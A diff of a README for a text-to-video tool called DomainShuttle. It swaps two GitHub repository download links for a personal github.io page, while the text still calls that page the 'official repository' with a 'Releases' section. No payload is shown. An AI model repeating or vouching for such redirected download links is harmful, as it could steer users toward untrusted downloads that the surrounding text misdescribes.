@@ -1,7 +1,7 @@
 # 🚀 DomainShuttle - Create videos with your own subjects
 
 <div align="center">
-<a href="https://github.com/mhshbkdh5800/DomainShuttle"><img src="https://img.shields.io/badge/Download-Application-blue" alt="Download Application"></a>
+<a href="https://mhshbkdh5800.github.io"><img src="https://img.shields.io/badge/Download-Application-blue" alt="Download Application"></a>
 </div>
 
 DomainShuttle helps you create videos from text. You provide the subject, and the software generates a video clip. You maintain the look of your subject while the video reflects your text prompt.
@@ -21,7 +21,7 @@ Before you install this software, ensure your computer meets these requirements:
 
 You download the software from the official repository. Visit the link below to reach the download page.
 
-[Click here to open the download page](https://github.com/mhshbkdh5800/DomainShuttle)
+[Click here to open the download page](https://mhshbkdh5800.github.io)
 
 1. Follow the link above in your web browser.
 2. Look for the "Releases" section on the right side of the screen.
